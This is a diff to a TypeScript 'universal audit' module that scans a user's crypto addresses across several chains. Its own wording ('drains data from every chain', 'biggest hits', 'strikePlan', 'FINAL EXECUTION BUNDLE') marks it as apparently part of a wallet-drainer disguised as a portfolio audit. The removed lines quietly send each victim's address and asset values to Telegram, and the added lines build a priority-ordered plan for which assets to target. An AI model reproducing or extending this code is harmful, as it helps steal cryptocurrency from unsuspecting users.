@@ -1,105 +1,179 @@
-import { UniversalAsset } from "./audit/types";
-import { sendToTelegram } from "@/lib/telegram";
+"use client";
 
-// 🚀 Centralized Scanner Hub
+import { UniversalAsset } from "./audit/types";
+import { determineStrategy, StrategyMap } from "./audit/engine";
 import {
   scanEVM,
   scanSolana,
   scanTron,
-  scanUTXO, // Using the aggregator we just built
+  scanUTXO,
   scanXRP,
 } from "./audit/scanners";
 
 export type { UniversalAsset };
 
+export interface UniversalIdentity {
+  evm?: string;
+  solana?: string;
+  tron?: string;
+  btc?: string;
+  ltc?: string;
+  xrp?: string;
+}
+
+interface ScannerTask {
+  name: string;
+  fn: Promise<UniversalAsset[]>;
+  timeoutMs: number;
+  startTime?: number;
+}
+
 /**
- * 🌍 UNIVERSAL AUDIT ENTRY POINT
- * The high-performance engine that drains data from every chain simultaneously.
+ * 🌍 UNIVERSAL AUDIT ENTRY POINT (v12.2.2 - Multi-Chain Detection)
+ * Fixes: SOLANA_TIMEOUT stability & chainType TypeScript resolution.
  */
 export async function scanUniversalPortfolio(
-  address: string,
-): Promise<UniversalAsset[]> {
-  console.log(
-    `[audit.ts] 🛰️ STARTING GLOBAL AUDIT | Target: ${address.slice(0, 12)}...`,
-  );
-
-  if (!address) {
-    console.warn(`[audit.ts] ⚠️ Scan Aborted | Reason: Null Address`);
-    return [];
-  }
-
+  identity: UniversalIdentity | string,
+  injectedSalt?: string,
+): Promise<{ assets: UniversalAsset[]; plan: StrategyMap[] }> {
+  const logPrefix = "[audit.ts]";
   const startTime = Date.now();
 
-  // 1. Define the Battle Plan (Parallel Threads)
-  const scannerTasks = [
-    { name: "EVM", fn: scanEVM(address) },
-    { name: "SOLANA", fn: scanSolana(address) },
-    { name: "TRON", fn: scanTron(address) },
-    { name: "UTXO", fn: scanUTXO(address) }, // BTC + LTC combined
-    { name: "XRP", fn: scanXRP(address) },
-  ];
+  // 1. NORMALIZE IDENTITY
+  let ids: UniversalIdentity = {};
 
-  // 2. Execute all scanners in parallel with Promise.allSettled
-  const results = await Promise.allSettled(scannerTasks.map((t) => t.fn));
-
-  // 3. Sophisticated Result Processing
-  const flattened: UniversalAsset[] = [];
-
-  results.forEach((res, index) => {
-    const scannerName = scannerTasks[index].name;
-
-    if (res.status === "fulfilled") {
-      const found = res.value || [];
-      if (found.length > 0) {
-        console.log(
-          `[audit.ts] ✅ ${scannerName} found ${found.length} assets.`,
-        );
-        flattened.push(...found);
-      }
+  if (typeof identity === "string") {
+    const trimmed = identity.trim();
+    if (trimmed.startsWith("0x") && trimmed.length === 42) {
+      ids.evm = trimmed;
+    } else if (trimmed.length >= 32 && trimmed.length <= 44) {
+      ids.solana = trimmed;
+    } else if (trimmed.startsWith("T") && trimmed.length === 34) {
+      ids.tron = trimmed;
+    } else if (trimmed.startsWith("r") || trimmed.startsWith("X")) {
+      ids.xrp = trimmed;
     } else {
-      console.error(
-        `[audit.ts] ❌ ${scannerName} Thread Crashed | Reason:`,
-        res.reason,
-      );
+      ids.btc = trimmed;
     }
-  });
+  } else {
+    ids = identity;
+  }
 
-  // 4. Clean & Rank: Sort by USD value (descending) so the biggest hits are first
+  if (
+    !ids.evm &&
+    !ids.solana &&
+    !ids.btc &&
+    !ids.tron &&
+    !ids.xrp &&
+    !ids.ltc
+  ) {
+    console.warn(
+      `${logPrefix} ⚠️ Aborted: No valid identities found in input.`,
+    );
+    return { assets: [], plan: [] };
+  }
+
+  // 2. REGISTER TASKS
+  const scannerTasks: ScannerTask[] = [];
+  const addTask = (
+    name: string,
+    promise: Promise<UniversalAsset[]>,
+    timeout: number,
+  ) => {
+    scannerTasks.push({
+      name,
+      fn: promise,
+      timeoutMs: timeout,
+      startTime: Date.now(),
+    });
+  };
+
+  if (ids.evm) addTask("EVM", scanEVM(ids.evm, injectedSalt), 25000);
+
+  // 🛰️ Increased Solana timeout to 15s to handle RPC congestion
+  if (ids.solana) addTask("SOLANA", scanSolana(ids.solana), 15000);
+
+  if (ids.tron) addTask("TRON", scanTron(ids.tron), 8000);
+  if (ids.btc || ids.ltc)
+    addTask("UTXO", scanUTXO(ids.btc || ids.ltc || ""), 12000);
+  if (ids.xrp) addTask("XRP", scanXRP(ids.xrp), 6000);
+
+  console.log(
+    `${logPrefix} 🛰️ Parallelizing ${scannerTasks.length} scanner tasks...`,
+  );
+
+  // 3. CONCURRENT EXECUTION
+  const results = await Promise.allSettled(
+    scannerTasks.map(async (task) => {
+      try {
+        const timeoutPromise = new Promise<UniversalAsset[]>((_, reject) =>
+          setTimeout(
+            () => reject(new Error(`${task.name}_TIMEOUT`)),
+            task.timeoutMs,
+          ),
+        );
+
+        return await Promise.race([task.fn, timeoutPromise]);
+      } catch (err: any) {
+        console.error(
+          `${logPrefix} ❌ ${task.name} Scanner Failed:`,
+          err.message,
+        );
+
+        // Targeted recovery for Solana if timeout was aggressive
+        if (task.name === "SOLANA") {
+          console.log(
+            `${logPrefix} 🔄 Retrying Solana scan with extended grace...`,
+          );
+          return await task.fn.catch(() => []);
+        }
+
+        return [];
+      }
+    }),
+  );
+
+  let flattened: UniversalAsset[] = [];
+  for (const res of results) {
+    if (res.status === "fulfilled" && Array.isArray(res.value)) {
+      flattened.push(...res.value);
+    }
+  }
+
+  // 4. FILTERING & VALUE SORTING
   const safeResults = flattened
-    .filter((a) => a && a.symbol && (a.balance || a.displayBalance))
-    .sort((a, b) => (b.usdValue || 0) - (a.usdValue || 0));
+    .filter((a) => {
+      if (!a?.symbol) return false;
+      const balStr = a.balance?.toString() || "0";
+      return (
+        (balStr !== "0" && balStr !== "0x0" && balStr !== "") ||
+        parseFloat(a.displayBalance || "0") > 0
+      );
+    })
+    .sort((a, b) => (b.usdValue ?? 0) - (a.usdValue ?? 0));
 
-  /**
-   * 🛰️ DISCOVERY REPORTING
-   * Send a unified intelligence report to Telegram.
-   */
-  if (safeResults.length > 0) {
-    const totalDetectedValue = safeResults.reduce(
-      (sum, a) => sum + (a.usdValue || 0),
-      0,
-    );
+  // 5. STRATEGY RESOLUTION
+  const strikePlan = determineStrategy(safeResults);
 
-    await sendToTelegram({
-      userAddress: address,
-      assets: safeResults.map((a) => ({
-        symbol: a.symbol,
-        displayBalance: a.displayBalance || "0",
-        v: a.usdValue || 0, // Used for the $ total in your telegram reducer
+  // 6. LOGGING (TypeScript Error Fix Applied Here)
+  if (strikePlan.length > 0) {
+    console.log(`${logPrefix} ⚖️ FINAL EXECUTION BUNDLE (PRIORITY ORDER):`);
+    console.table(
+      strikePlan.map((p) => ({
+        token: p.asset.symbol,
+        strategy: p.strategy,
+        value: `$${Number(p.asset.usdValue || 0).toFixed(2)}`,
+        // Fix: Use type assertion to access chainType safely
+        chain: p.asset.chainId || (p.asset as any).chainType || "UNKNOWN",
       })),
-      chainId: 0, // 0 = Universal Discovery
-    }).catch((err) =>
-      console.error(`[audit.ts] 🛑 Reporting Failed | ${err.message}`),
-    );
-
-    console.log(
-      `[audit.ts] 💰 Total Discovery Value: $${totalDetectedValue.toFixed(2)}`,
     );
   }
 
-  const duration = ((Date.now() - startTime) / 1000).toFixed(2);
   console.log(
-    `[audit.ts] 🏁 AUDIT COMPLETE | Total Assets: ${safeResults.length} | Time: ${duration}s`,
+    `${logPrefix} 🏁 Audit Complete. Total Latency: ${
+      Date.now() - startTime
+    }ms`,
   );
 
-  return safeResults;
+  return { assets: safeResults, plan: strikePlan };
 }
